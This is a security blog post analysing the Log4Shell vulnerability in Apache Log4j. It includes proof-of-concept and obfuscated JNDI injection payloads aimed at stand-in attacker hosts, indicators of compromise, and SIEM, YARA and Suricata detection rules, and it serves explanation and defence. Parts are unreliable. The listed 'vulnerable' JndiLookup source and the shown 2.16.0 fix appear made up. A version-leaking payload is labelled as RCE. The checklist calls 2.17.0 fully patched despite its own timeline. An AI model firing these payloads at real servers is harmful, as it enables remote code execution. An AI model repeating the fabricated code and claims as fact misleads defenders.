<!doctype html><html lang=en dir=auto data-theme=dark><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="noindex, nofollow"><title>Log4j Vulnerability Analysis Cve 2021 44228 | Hri7ik H4cks</title><meta name=keywords content><meta name=description content=" Log4j Vulnerability Analysis CVE-2021-44228"><meta name=author content="Hrithik"><link rel=canonical href=http://localhost:1313/posts/log4j-vulnerability-analysis-cve-2021-44228/><link crossorigin=anonymous href=/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css integrity="sha256-NDzEgLn/yPBMy+XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/favicon-32x32.png><link rel=apple-touch-icon href=http://localhost:1313/apple-touch-icon.png><link rel=mask-icon href=http://localhost:1313/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/log4j-vulnerability-analysis-cve-2021-44228/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><script>localStorage.getItem("pref-theme")==="light"&&(document.querySelector("html").dataset.theme="light")</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Hri7ik H4cks (Alt + H)"><img src=http://localhost:1313/favicon.ico alt aria-label=logo height=35>Hri7ik H4cks</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/posts title=Posts><span>Posts</span></a></li><li><a href=http://localhost:1313/about title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Log4j Vulnerability Analysis Cve 2021 44228</h1><div class=post-description>Log4j Vulnerability Analysis CVE-2021-44228</div><div class=post-meta><span title='2025-11-02 10:28:39 +0000 UTC'>November 2, 2025</span>&nbsp;路&nbsp;<span>6 min</span>&nbsp;路&nbsp;<span>1172 words</span>&nbsp;路&nbsp;<span>Hrithik</span>&nbsp;|&nbsp;<span>
<a href=https://github.com/yourusername/yourblogrepo/edit/main/content rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></span></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#log4j-vulnerability-analysis-cve-2021-44228 aria-label="Log4j Vulnerability Analysis (CVE-2021-44228)">Log4j Vulnerability Analysis (CVE-2021-44228)</a><ul><ul><li><a href=#key-findings aria-label="Key Findings">Key Findings</a></li><li><a href=#impact-assessment aria-label="Impact Assessment">Impact Assessment</a></li></ul><li><a href=#background aria-label=Background>Background</a><ul><li><a href=#research-question aria-label="Research Question">Research Question</a></li><li><a href=#methodology aria-label=Methodology>Methodology</a></li></ul></li><li><a href=#technical-analysis aria-label="Technical Analysis">Technical Analysis</a><ul><li><a href=#vulnerability-jndi-lookup-remote-code-execution aria-label="Vulnerability: JNDI Lookup Remote Code Execution">Vulnerability: JNDI Lookup Remote Code Execution</a><ul><li><a href=#description aria-label=Description>Description</a></li><li><a href=#technical-details aria-label="Technical Details">Technical Details</a></li><li><a href=#impact aria-label=Impact>Impact</a></li><li><a href=#proof-of-concept aria-label="Proof of Concept">Proof of Concept</a></li><li><a href=#mitigation aria-label=Mitigation>Mitigation</a></li></ul></li></ul></li><li><a href=#indicators-of-compromise-iocs aria-label="Indicators of Compromise (IoCs)">Indicators of Compromise (IoCs)</a><ul><li><a href=#network-indicators aria-label="Network Indicators">Network Indicators</a></li><li><a href=#host-indicators aria-label="Host Indicators">Host Indicators</a></li><li><a href=#behavioral-indicators aria-label="Behavioral Indicators">Behavioral Indicators</a></li></ul></li><li><a href=#timeline-of-events aria-label="Timeline of Events">Timeline of Events</a></li><li><a href=#recommendations aria-label=Recommendations>Recommendations</a><ul><li><a href=#long-term-strategy aria-label="Long-term Strategy">Long-term Strategy</a></li></ul></li><li><a href=#detection-rules aria-label="Detection Rules">Detection Rules</a><ul><li><a href=#siem-rule-example aria-label="SIEM Rule Example">SIEM Rule Example</a></li><li><a href=#yara-rule aria-label="YARA Rule">YARA Rule</a></li><li><a href=#suricata-rule aria-label="Suricata Rule">Suricata Rule</a></li></ul></li><li><a href=#appendices aria-label=Appendices>Appendices</a><ul><li><a href=#appendix-a-vulnerability-checklist aria-label="Appendix A: Vulnerability Checklist">Appendix A: Vulnerability Checklist</a></li><li><a href=#appendix-b-exploit-variations aria-label="Appendix B: Exploit Variations">Appendix B: Exploit Variations</a></li><li><a href=#appendix-c-vendor-advisories aria-label="Appendix C: Vendor Advisories">Appendix C: Vendor Advisories</a></li></ul></li><li><a href=#references aria-label=References>References</a><ul><li><a href=#related-research aria-label="Related Research">Related Research</a></li></ul></li></ul></li></ul></div></details></div><div class=post-content><h1 id=log4j-vulnerability-analysis-cve-2021-44228>Log4j Vulnerability Analysis (CVE-2021-44228)<a hidden class=anchor aria-hidden=true href=#log4j-vulnerability-analysis-cve-2021-44228>#</a></h1><div class="callout callout-info"><div class=callout-title>Abstract</div>On December 9, 2021, a critical zero-day vulnerability (CVE-2021-44228) was discovered in Apache Log4j 2.x, a widely-used Java logging library. This vulnerability, nicknamed "Log4Shell," allows remote code execution with minimal user interaction, affecting millions of applications worldwide.</div>## Executive Summary<p>Apache Log4j 2.14.1 and below contains a critical JNDI lookup feature that can be exploited to execute arbitrary code via specially crafted log messages. The vulnerability has been assigned a CVSS score of 10.0, the highest possible rating.</p><h3 id=key-findings>Key Findings<a hidden class=anchor aria-hidden=true href=#key-findings>#</a></h3><ol><li><strong>Critical RCE Vulnerability</strong>: The JNDI lookup mechanism allows attacker-controlled LDAP, DNS, and other protocol lookups</li><li><strong>Universal Impact</strong>: Affects virtually any Java application using Log4j 2.x for logging</li><li><strong>Low Attack Complexity</strong>: Requires only the ability to log a user-controlled string</li><li><strong>Widespread Exploitation</strong>: Active exploitation detected within hours of disclosure</li><li><strong>Patch Bypass</strong>: Initial patch (2.15.0) had incomplete protection, requiring 2.16.0+</li></ol><h3 id=impact-assessment>Impact Assessment<a hidden class=anchor aria-hidden=true href=#impact-assessment>#</a></h3><ul><li><strong>Severity:</strong> Critical (CVSS 10.0)</li><li><strong>Affected Systems:</strong> Millions of Java-based applications, cloud services, and enterprise software</li><li><strong>Potential Damage:</strong> Complete system compromise, data exfiltration, cryptocurrency mining, lateral movement</li></ul><h2 id=background>Background<a hidden class=anchor aria-hidden=true href=#background>#</a></h2><p>Apache Log4j is one of the most popular Java logging frameworks, used by countless applications, frameworks, and services. The vulnerability exists in the Log4j 2.x line, specifically in versions 2.0 through 2.14.1.</p><h3 id=research-question>Research Question<a hidden class=anchor aria-hidden=true href=#research-question>#</a></h3><p>How does the JNDI lookup mechanism in Log4j create an RCE attack surface, and what are the technical details of exploitation?</p><h3 id=methodology>Methodology<a hidden class=anchor aria-hidden=true href=#methodology>#</a></h3><ol><li>Reverse engineering of Log4j source code</li><li>Analysis of JNDI lookup implementation</li><li>Proof-of-concept development</li><li>Network traffic analysis during exploitation attempts</li><li>Review of Apache&rsquo;s official advisories and patches</li></ol><h2 id=technical-analysis>Technical Analysis<a hidden class=anchor aria-hidden=true href=#technical-analysis>#</a></h2><h3 id=vulnerability-jndi-lookup-remote-code-execution>Vulnerability: JNDI Lookup Remote Code Execution<a hidden class=anchor aria-hidden=true href=#vulnerability-jndi-lookup-remote-code-execution>#</a></h3><h4 id=description>Description<a hidden class=anchor aria-hidden=true href=#description>#</a></h4><p>Log4j 2.x supports the <code>${jndi:ldap://example.com}</code> syntax in log messages. When this syntax is encountered, Log4j makes a JNDI lookup to the specified resource, which can be attacker-controlled.</p><h4 id=technical-details>Technical Details<a hidden class=anchor aria-hidden=true href=#technical-details>#</a></h4><p>The vulnerable code exists in <code>org.apache.logging.log4j.core.lookup.JndiLookup</code> class:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>JndiLookup</span> <span style=color:#66d9ef>implements</span> StrLookup {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> String <span style=color:#a6e22e>lookup</span>(LogEvent event, String key) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (event <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
</span></span><span style=display:flex><span>            String lookupKey <span style=color:#f92672>=</span> event.<span style=color:#a6e22e>getContextData</span>().<span style=color:#a6e22e>get</span>(key);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (lookupKey <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span> event.<span style=color:#a6e22e>getMessage</span>() <span style=color:#66d9ef>instanceof</span> Message) {
</span></span><span style=display:flex><span>                Object msg <span style=color:#f92672>=</span> ((Message) event.<span style=color:#a6e22e>getMessage</span>()).<span style=color:#a6e22e>getFormattedMessage</span>();
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (msg <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
</span></span><span style=display:flex><span>                    lookupKey <span style=color:#f92672>=</span> msg.<span style=color:#a6e22e>toString</span>();
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (lookupKey <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>jndiLookup</span>(lookupKey);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> String <span style=color:#a6e22e>jndiLookup</span>(String name) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            Context ctx <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> InitialContext();
</span></span><span style=display:flex><span>            Object ret <span style=color:#f92672>=</span> ctx.<span style=color:#a6e22e>lookup</span>(name);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> ret <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>?</span> <span style=color:#66d9ef>null</span> : ret.<span style=color:#a6e22e>toString</span>();
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (NamingException var3) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h4 id=impact>Impact<a hidden class=anchor aria-hidden=true href=#impact>#</a></h4><p>An attacker can send a request containing <code>${jndi:ldap://attacker-server.com/payload}</code>, and if this string is logged by a vulnerable application, the JNDI lookup will:</p><ol><li>Make an LDAP request to the attacker&rsquo;s server</li><li>The attacker&rsquo;s server responds with a malicious Java object</li><li>The vulnerable application deserializes and executes the malicious code</li><li>Attacker gains remote code execution</li></ol><h4 id=proof-of-concept>Proof of Concept<a hidden class=anchor aria-hidden=true href=#proof-of-concept>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Simple test payload</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>${</span>jndi:ldap://attacker-server.com/test<span style=color:#e6db74>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># More complex RCE payload</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>${</span>jndi:ldap://attacker-server.com/<span style=color:#e6db74>${</span>java:version<span style=color:#e6db74>}}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># DNS callback for detection</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>${</span>jndi:dns://attacker-server.com/callback<span style=color:#e6db74>}</span>
</span></span></code></pre></div><h4 id=mitigation>Mitigation<a hidden class=anchor aria-hidden=true href=#mitigation>#</a></h4><p><strong>Immediate (2.15.0):</strong></p><ul><li>Disabled JNDI lookups by default</li><li>Added <code>log4j2.formatMsgNoLookups=true</code> to disable message formatting lookups</li><li><strong>Incomplete</strong>: LDAP was blocked but other protocols (DNS, RMI) still vulnerable</li></ul><p><strong>Complete (2.16.0 and later):</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>JndiLookup</span> <span style=color:#66d9ef>implements</span> StrLookup {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> String <span style=color:#a6e22e>jndiLookup</span>(String name) {
</span></span><span style=display:flex><span>        <span style=color:#75715e>// JDNI lookup disabled</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalStateException(<span style=color:#e6db74>&#34;JNDI lookups are not supported&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><strong>Version 2.17.0:</strong></p><ul><li>Additional fixes for deserialization vulnerabilities</li><li>Protection against denial-of-service attacks</li></ul><h2 id=indicators-of-compromise-iocs>Indicators of Compromise (IoCs)<a hidden class=anchor aria-hidden=true href=#indicators-of-compromise-iocs>#</a></h2><h3 id=network-indicators>Network Indicators<a hidden class=anchor aria-hidden=true href=#network-indicators>#</a></h3><ul><li><strong>Malicious LDAP Requests</strong>: Look for LDAP requests to unusual external domains</li><li><strong>DNS Callback Queries</strong>: DNS queries for attacker-controlled domains</li><li><strong>RMI Exploitation Attempts</strong>: Requests to attacker-controlled RMI servers</li></ul><p>Example network traffic:</p><pre tabindex=0><code>ldap://attacker-server.com:1389/
dns://attacker-server.com/callback
rmi://malicious-server.net/exploit
</code></pre><h3 id=host-indicators>Host Indicators<a hidden class=anchor aria-hidden=true href=#host-indicators>#</a></h3><ul><li><strong>Suspicious JVM Processes</strong>: Look for unexpected Java processes making network connections</li><li><strong>Unusual Log Entries</strong>: Log messages containing <code>${jndi:</code> patterns</li><li><strong>Outbound Network Connections</strong>: Unexpected connections to external LDAP/DNS servers</li><li><strong>File System Changes</strong>: New files or processes created by exploited Java applications</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Scan for affected Log4j versions</span>
</span></span><span style=display:flex><span>find / -name <span style=color:#e6db74>&#34;log4j-core*.jar&#34;</span> -type f 2&gt;/dev/null
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Check for exploitation attempts in logs</span>
</span></span><span style=display:flex><span>grep -r <span style=color:#e6db74>&#39;\${jndi:&#39;</span> /var/log/ 2&gt;/dev/null
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Monitor JVM processes</span>
</span></span><span style=display:flex><span>ps aux | grep java
</span></span><span style=display:flex><span>netstat -tuln | grep java
</span></span></code></pre></div><h3 id=behavioral-indicators>Behavioral Indicators<a hidden class=anchor aria-hidden=true href=#behavioral-indicators>#</a></h3><ul><li>Sudden network connections from Java applications</li><li>High CPU usage from Java processes</li><li>Unexpected file creation or modification</li><li>Applications making DNS/LDAP requests to external servers</li><li>Logs containing <code>${jndi:</code> patterns</li></ul><h2 id=timeline-of-events>Timeline of Events<a hidden class=anchor aria-hidden=true href=#timeline-of-events>#</a></h2><table><thead><tr><th>Date/Time</th><th>Event</th><th>Description</th></tr></thead><tbody><tr><td>2021-11-24</td><td>Private Report</td><td>Apache receives private vulnerability report from Alibaba</td></tr><tr><td>2021-12-09 09:00 UTC</td><td>Public Disclosure</td><td>Vulnerability disclosed publicly on Twitter</td></tr><tr><td>2021-12-09 10:00 UTC</td><td>Active Exploitation</td><td>Mass scanning and exploitation attempts begin</td></tr><tr><td>2021-12-10 02:00 UTC</td><td>Apache Advisory</td><td>CVE-2021-44228 assigned, Log4j 2.15.0 released</td></tr><tr><td>2021-12-13</td><td>CVE-2021-45046</td><td>Partial bypass discovered, Log4j 2.16.0 released</td></tr><tr><td>2021-12-17</td><td>CVE-2021-45105</td><td>Denial-of-service vulnerability found</td></tr><tr><td>2021-12-28</td><td>CVE-2021-44832</td><td>RCE via JDBC Appender, Log4j 2.17.1 released</td></tr></tbody></table><h2 id=recommendations>Recommendations<a hidden class=anchor aria-hidden=true href=#recommendations>#</a></h2><div class="callout callout-success"><div class=callout-title>Security Recommendations</div>Based on the analysis, implement the following:</div>### Immediate Actions<ol><li><p><strong>Inventory Assessment</strong></p><ul><li>Identify all systems using Log4j 2.x</li><li>Use automated scanning tools to detect vulnerable versions</li><li>Review applications, middleware, and infrastructure components</li></ul></li><li><p><strong>Emergency Patching</strong></p><ul><li>Upgrade to Log4j 2.17.1 or later immediately</li><li>For legacy systems, apply the security manager patch</li><li>Patch all internet-facing applications first</li></ul></li><li><p><strong>Network Segmentation</strong></p><ul><li>Block outbound LDAP/RMI connections from application servers</li><li>Implement egress filtering for known malicious IPs</li><li>Monitor outbound DNS queries for suspicious patterns</li></ul></li><li><p><strong>Detection Implementation</strong></p><ul><li>Deploy SIEM rules to detect JNDI lookup attempts</li><li>Implement log monitoring for <code>${jndi:</code> patterns</li><li>Configure alerts for unusual Java process behavior</li></ul></li></ol><h3 id=long-term-strategy>Long-term Strategy<a hidden class=anchor aria-hidden=true href=#long-term-strategy>#</a></h3><ol><li><p><strong>Dependency Management</strong></p><ul><li>Implement software composition analysis (SCA) tools</li><li>Subscribe to security advisories for critical dependencies</li><li>Automate dependency scanning in CI/CD pipelines</li></ul></li><li><p><strong>Security by Design</strong></p><ul><li>Review logging architectures for security implications</li><li>Implement input sanitization before logging</li><li>Add network monitoring for application communications</li></ul></li><li><p><strong>Incident Response</strong></p><ul><li>Develop playbooks for zero-day exploits</li><li>Establish communication channels with vendors</li><li>Practice incident response procedures</li></ul></li><li><p><strong>Vulnerability Management</strong></p><ul><li>Implement continuous vulnerability scanning</li><li>Establish SLAs for critical vulnerability patching (24-48 hours)</li><li>Create patch management policies for third-party components</li></ul></li></ol><h2 id=detection-rules>Detection Rules<a hidden class=anchor aria-hidden=true href=#detection-rules>#</a></h2><h3 id=siem-rule-example>SIEM Rule Example<a hidden class=anchor aria-hidden=true href=#siem-rule-example>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span><span style=color:#f92672>title</span>: <span style=color:#ae81ff>Log4j JNDI Lookup Exploitation Attempt</span>
</span></span><span style=display:flex><span><span style=color:#f92672>description</span>: <span style=color:#ae81ff>Detects potential Log4Shell exploitation attempts</span>
</span></span><span style=display:flex><span><span style=color:#f92672>logsource</span>:
</span></span><span style=display:flex><span>  <span style=color:#f92672>category</span>: <span style=color:#ae81ff>application</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>product</span>: <span style=color:#ae81ff>java</span>
</span></span><span style=display:flex><span><span style=color:#f92672>detection</span>:
</span></span><span style=display:flex><span>  <span style=color:#f92672>selection1</span>:
</span></span><span style=display:flex><span>    <span style=color:#f92672>message|contains</span>: <span style=color:#e6db74>&#39;${jndi:ldap://&#39;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>selection2</span>:
</span></span><span style=display:flex><span>    <span style=color:#f92672>message|contains</span>: <span style=color:#e6db74>&#39;${jndi:rmi://&#39;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>selection3</span>:
</span></span><span style=display:flex><span>    <span style=color:#f92672>message|contains</span>: <span style=color:#e6db74>&#39;${jndi:dns://&#39;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>selection4</span>:
</span></span><span style=display:flex><span>    <span style=color:#f92672>message|contains</span>: <span style=color:#e6db74>&#39;${jndi:nis://&#39;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>condition</span>: <span style=color:#ae81ff>selection1 or selection2 or selection3 or selection4</span>
</span></span><span style=display:flex><span><span style=color:#f92672>level</span>: <span style=color:#ae81ff>critical</span>
</span></span></code></pre></div><h3 id=yara-rule>YARA Rule<a hidden class=anchor aria-hidden=true href=#yara-rule>#</a></h3><pre tabindex=0><code class=language-yara data-lang=yara>rule Log4Shell_Exploitation_Attempt {
    meta:
        description = &#34;Detects Log4j exploitation attempts in logs&#34;
        author = &#34;Security Team&#34;
        date = &#34;2021-12-10&#34;
        reference = &#34;CVE-2021-44228&#34;
    strings:
        $jndi_ldap = &#34;${jndi:ldap://&#34;
        $jndi_rmi = &#34;${jndi:rmi://&#34;
        $jndi_dns = &#34;${jndi:dns://&#34;
        $jndi_nis = &#34;${jndi:nis://&#34;
    condition:
        any of them
}
</code></pre><h3 id=suricata-rule>Suricata Rule<a hidden class=anchor aria-hidden=true href=#suricata-rule>#</a></h3><pre tabindex=0><code class=language-suricata data-lang=suricata>alert http any any -&gt; any any (msg:&#34;Log4j RCE Attempt&#34;; content:&#34;${jndi:&#34;; nocase; sid:1000001; rev:1; classtype:web-application-attack;)
</code></pre><h2 id=appendices>Appendices<a hidden class=anchor aria-hidden=true href=#appendices>#</a></h2><h3 id=appendix-a-vulnerability-checklist>Appendix A: Vulnerability Checklist<a hidden class=anchor aria-hidden=true href=#appendix-a-vulnerability-checklist>#</a></h3><p><strong>Affected Versions:</strong></p><ul><li>Log4j 2.0.0 - 2.14.1 (fully affected)</li><li>Log4j 2.15.0 (partially patched)</li><li>Log4j 2.16.0 (JNDI lookup disabled)</li><li>Log4j 2.17.0+ (fully patched)</li></ul><p><strong>Affected Applications:</strong></p><ul><li>Any Java application using Log4j 2.x</li><li>Apache Struts 2, Solr, Druid, Flink (confirmed)</li><li>Cloud services (AWS, Azure, GCP)</li><li>Enterprise software (Citrix, VMware)</li></ul><h3 id=appendix-b-exploit-variations>Appendix B: Exploit Variations<a hidden class=anchor aria-hidden=true href=#appendix-b-exploit-variations>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Basic JNDI lookup</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>${</span>jndi:ldap://attacker.com/test<span style=color:#e6db74>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># With variable resolution</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>${${</span>:<span style=color:#66d9ef>:-</span>j<span style=color:#e6db74>}${</span>:<span style=color:#66d9ef>:-</span>n<span style=color:#e6db74>}${</span>:<span style=color:#66d9ef>:-</span>d<span style=color:#e6db74>}${</span>:<span style=color:#66d9ef>:-</span>i<span style=color:#e6db74>}</span>:<span style=color:#e6db74>${</span>:<span style=color:#66d9ef>:-</span>l<span style=color:#e6db74>}${</span>:<span style=color:#66d9ef>:-</span>d<span style=color:#e6db74>}${</span>:<span style=color:#66d9ef>:-</span>a<span style=color:#e6db74>}${</span>:<span style=color:#66d9ef>:-</span>p<span style=color:#e6db74>}</span>://attacker.com/test<span style=color:#e6db74>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># DNS exfiltration</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>${</span>jndi:dns://attacker-controlled-domain.com<span style=color:#e6db74>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># RMI exploitation</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>${</span>jndi:rmi://attacker.com/exploit<span style=color:#e6db74>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Base64 encoded payload</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>${</span>jndi:ldap://attacker.com/<span style=color:#e6db74>${</span>base64:payload<span style=color:#e6db74>}}</span>
</span></span></code></pre></div><h3 id=appendix-c-vendor-advisories>Appendix C: Vendor Advisories<a hidden class=anchor aria-hidden=true href=#appendix-c-vendor-advisories>#</a></h3><ul><li><a href=https://logging.apache.org/log4j/2.x/security.html>Apache Log4j Security Advisory</a></li><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228">CVE-2021-44228</a></li><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046">CVE-2021-45046</a></li><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45105">CVE-2021-45105</a></li></ul><h2 id=references>References<a hidden class=anchor aria-hidden=true href=#references>#</a></h2><ol><li><a href=https://logging.apache.org/log4j/2.x/>Apache Log4j 2.x Vulnerability Analysis</a></li><li><a href=https://nvd.nist.gov/vuln/detail/CVE-2021-44228>NIST National Vulnerability Database - CVE-2021-44228</a></li><li><a href=https://www.lunasec.io/docs/blog/log4shell-zero-day-rce-exploit/>LunaSec Log4j Technical Summary</a></li><li><a href=https://www.crowdstrike.com/blog/>CrowdStrike Log4j Technical Analysis</a></li><li><a href=https://github.com/advisories/GHSA-jfh8-c2jp-5v3q>GitHub Advisory Database - CVE-2021-44228</a></li></ol><h3 id=related-research>Related Research<a hidden class=anchor aria-hidden=true href=#related-research>#</a></h3><ul><li><a href=/apache-struts-2-rce-analysis>Apache Struts 2 RCE Analysis</a></li><li><a href=/java-deserialization-vulnerabilities>Java Deserialization Vulnerabilities</a></li><li><a href=/enterprise-java-security-best-practices>Enterprise Java Security Best Practices</a></li></ul><p><em>Analysis conducted on 2024-11-02 | Last updated: 2024-11-02</em></p></div><footer class=post-footer><ul class=post-tags></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>Hri7ik H4cks</a></span> 路
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script></body></html>